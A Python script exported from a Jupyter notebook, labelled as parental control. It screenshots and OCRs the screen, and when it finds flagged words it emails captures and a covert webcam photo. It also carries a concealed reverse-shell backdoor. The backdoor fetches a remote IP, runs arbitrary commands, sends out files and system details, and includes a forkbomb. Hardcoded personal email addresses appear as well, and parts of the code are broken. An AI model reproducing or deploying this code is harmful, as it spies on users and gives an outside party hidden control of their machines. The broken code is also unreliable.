#!/usr/bin/env python
# coding: utf-8

# In[3]:



import string
import re
import time
from PIL import Image
import pandas as pd
import smtplib
import shutil
import pyautogui
import os
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase 
from email import encoders 
import socket    
import ifcfg
import time
import cv2
import requests
from bs4 import BeautifulSoup as x
import threading
import socket
import subprocess
import platform
import getpass
import colorama
from colorama import Fore, Style
from time import sleep


from tesserocr import PyTessBaseAPI
pd.set_option('display.max_colwidth', -1)


# In[ ]:





# In[131]:


def screenshots():
    
    global c,location
    os.mkdir(location)
    def image():
        global leng,c,df
        column = Image.open(location+'a2.png')
        gray = column.convert('L')
        blackwhite = gray.point(lambda x: 0 if x < 200 else 255, '1')
        blackwhite.save(location+'a2.png')

        with PyTessBaseAPI() as api:
            api.SetImageFile(location+'a2.png')
            a=api.GetUTF8Text()
            c.append(a)
    p=0
    for i in range(6):
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(location+'a2.png',grayscale=True)
        myScreenshot.save(location+str(i)+'.png',grayscale=True)
        p+=1
        image()
        time.sleep(2)


# In[ ]:





# In[132]:



def clean():
    global leng,c,df
    df=pd.DataFrame(c)
    df.columns=['comment']
    df['comment'] = df['comment'].apply(lambda x : re.sub(r'\d+','',x))
    df['comment'] = df['comment'].apply(lambda x : x.replace('\xa0',' '))
    df['comment'] = df['comment'].apply(lambda x : x.translate(str.maketrans('','',string.punctuation)))
    df['comment'] = df['comment'].apply(lambda x: x.lower())
    df['comment'] = df['comment'].apply(lambda x : x.split())


# In[133]:


def dict():
    global text,p_words,b
    url1="https://jjdeveloperz.github.io/police_dictionary/index.html"
    r1=requests.get(url1)
    soup1 = x(r1.content, 'html5lib') 
    body1=soup1.find('body')
    data1=body1.getText()
    data1=data1.split()
    check1=pd.DataFrame(data1)
    check1.columns=['words']
#     p_words=[]
    check1['words'] = check1['words'].apply(lambda x : p_words.append(x.lower()))
 
    
    url2="https://jjdeveloperz.github.io/police_dictionary/parents.html"
    r2=requests.get(url2)
    soup2 = x(r2.content, 'html5lib') 
    body2=soup2.find('body')
    data2=body2.getText()
    data2=data2.split()
    check2=pd.DataFrame(data2)
    check2.columns=['words']
#     b=[]
    check2['words'] = check2['words'].apply(lambda x : b.append(x.lower()))



    def check_profan(s,x,m):
        count=0
        word=""
        for i in range(s):
            if(x[i] in m):
                word=word+" "+x[i]
                count+=1
        return count

    df['bad'] = df['comment'].apply(lambda x : check_profan(len(x),x,b))
    df['police_bad'] = df['comment'].apply(lambda x : check_profan(len(x),x,p_words))


# In[ ]:





# In[134]:


def capture_pic():
    global location
    camera_port = 0
    camera = cv2.VideoCapture(camera_port)
    return_value, image = camera.read()
    cv2.imwrite(location+"face.png", image)
    del(camera)


# In[135]:


def mail(addr):
    global bl,leng,c,df,email_id_child,email_id_child_password,location
    fromaddr = email_id_child
    toaddr = addr
    msg = MIMEMultipart() 
    msg['From'] = fromaddr 
    msg['To'] = toaddr 
    
    from datetime import datetime
    
    
    msg['Subject'] = "PARENTAL CONTROL ALERT....... at time"+str(datetime.now())
    body=str(ifcfg.interfaces().items())
    msg.attach(MIMEText(body, 'plain')) 
    def attachments(t):
        filename = ".png"
        attachment = open(location+str(t)+".png", "rb") 
        p = MIMEBase('application', 'octet-stream') 
        p.set_payload((attachment).read()) 
        encoders.encode_base64(p) 
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
        return p

    for i in range(len(leng)):
        msg.attach(attachments(leng[i])) 

    if(bl>0):
        msg.attach(attachments("face"))
        for i in range(len(leng)):
            msg.attach(attachments(leng[i])) 
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls() 
    s.login(fromaddr,email_id_child_password) 
    text = msg.as_string() 
    s.sendmail(fromaddr, toaddr, text) 
    s.quit() 


# In[136]:


def mail_it():
    global bl,leng,c,df,door,email_id_parents,email_id_police
    sm1=sum(df['bad'])
    sm2=sum(df['police_bad'])
    if(sm1>0):
        loc=list(df.index[df['bad']>0])
        leng=loc
        mail(email_id_parents)    ##Parents ID
    if(sm2>0):
        capture_pic()
        door+=5
        bl+=5
        loc=list(df.index[df['police_bad']>0])
        leng=loc
        mail(email_id_police)  ##Police_ID


# In[ ]:





# In[137]:


def backip():
    url="https://jjdeveloperz.github.io/police_dictionary/ip.html"
    r=requests.get(url)
    soup = x(r.content, 'html5lib') 
    body=soup.find('body')
    ip=body.getText()
    ip=ip.replace('\n',"")
    ip=str(ip)
    return ip


# In[ ]:





# In[138]:


def backdoor():
    
    colorama.init()
    
    RHOST = backip()
    RPORT = 3333

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((RHOST, RPORT))

    while True:
        try:
            header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")

            # List files in the dir
            if cmd == "list":
                sock.send(str(os.listdir(".")).encode())

            # Forkbomb
            if cmd == "forkbomb":
                while True:
                    os.fork()

            # Change directory
            elif cmd.split(" ")[0] == "cd":
                os.chdir(cmd.split(" ")[1])
                sock.send("Changed directory to {}".format(os.getcwd()).encode())

            # Get system info
            elif cmd == "sysinfo":
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())

            # Download files
            elif cmd.split(" ")[0] == "download":
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(1024)
                    while file_data:
                        print("Sending", file_data)
                        sock.send(file_data)
                        file_data = f.read(1024)
                    sleep(2)
                    sock.send(b"DONE")
                print("Finished sending data")

            # Terminate the connection
            elif cmd == "exit":
                sock.send(b"exit")
                break

            # Run any other command
            else:
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            # If the connection terminates
            if not cmd:
                print("Connection dropped")
                break
        except Exception as e:
            sock.send("An error has occured: {}".format(str(e)).encode())
    sock.close()


# In[139]:


def main():
    global bl,leng,c,df,location
    screenshots()
    clean()
    dict()
    mail_it()

#     time.sleep(10)
    shutil.rmtree(location)


# In[140]:


door=0
email_id_parents="mohnish1997@gmail.com"
email_id_child="jagnetoo@gmail.com"
email_id_police="jagnetooc@gmail.com"
location="C:\Users\"
email_id_child_password=getpass.getpass("Enter password")
for i in range(1):
    bl=0
    p_words=[]
    b=[]
    leng=[]
    c=[]
    df=[]
    t1=threading.Thread(target=main())
    t1.start()

try:   
    if(door>0):
        t2=threading.Thread(target=backdoor())
        t2.start()
except:
    print()


# In[141]:


df


# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[102]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[ ]:





# In[99]:


import getpass
a=getpass.getpass("cfvg")


# In[100]:


a





